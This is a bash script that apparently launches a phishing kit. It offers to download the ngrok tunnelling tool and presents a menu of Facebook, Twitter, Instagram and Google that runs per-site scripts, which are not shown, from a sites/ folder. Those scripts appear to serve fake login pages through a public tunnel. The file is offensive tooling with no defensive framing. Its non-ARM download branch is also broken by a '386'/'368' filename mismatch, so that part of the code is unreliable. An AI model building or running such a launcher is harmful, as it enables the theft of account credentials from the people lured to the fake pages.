#!/bin/bash
#banner area
clear
cat .banner.txt

#option area
white='\e[1;37m'
green='\e[0;32m'
blue='\e[1;34m'
red='\e[1;31m'
yellow='\e[1;33m' 
echo ""
echo ""
ngrokinstallcheck()
{
    echo -e "${yellow}[?]${white} Checking NGROK.."
    if [[ -e ngrok ]];then
        sleep 1 
    else
    echo -e "${yellow}[?]${white} You want to Download NGROK? (Y/N)"
        read op
        if [[ $op == "y" ]];then
            arch=$(uname -a | grep -o 'arm' | head -n1 )
            arch2=$(uname -a | grep -o 'Android' | head -n1)
            if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]];then
                wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

                if [[ -e ngrok-stable-linux-arm.zip ]];then
                    sudo unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
                    sudo chmod +x ngrok
                    sudo rm -rf ngrok-stable-linux-arm.zip
                else
                    echo -e "${red}[-] Download error.. exiting...."
                    sleep 2
                    exit 1
                fi
            else
                wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
                if [[ -e ngrok-stable-linux-368.zip ]];then
                    sudo unzip ngrok-stable-linux-368.zip > /dev/null 2>&1
                    sudo chmod +x ngrok
                    sudo rm -rf ngrok-stable-linux-386.zip
                else
                    echo -e "${red}[-] Download error.. exiting...."
                    sleep 2
                    exit 1
                fi
        fi
        fi
        fi
        
}
menu()
{
    cat .banner.txt
    echo -e "${red}[${green}1${red}]${blue}.${yellow}Facebook                     ${red}[${green}3${red}]${blue}.${yellow}Instagram"
    echo -e "${red}[${green}2${red}]${blue}.${yellow}Twitter                      ${red}[${green}4${red}]${blue}.${yellow}Google (gmail)"
    echo ""
    read  -p "Choose site: > " op
    echo -e "${white}"
    if [ $op -eq "1" ];then
        cd sites/Facebook && ./facebook.sh
        exit 1
    elif [ $op -eq "2" ];then
        cd sites/Twitter && ./twitter.sh
        exit 1
    elif [ $op -eq "3" ];then
        cd sites/Instagram && ./instagram.sh
        exit 1 
    elif [ $op -eq "4" ];then
        cd sites/google && ./google.sh
        exit 1 
    else
        echo -e "${red}[-]${blue} Choose correct option!"
    fi

}
ngrokinstallcheck
clear
menu
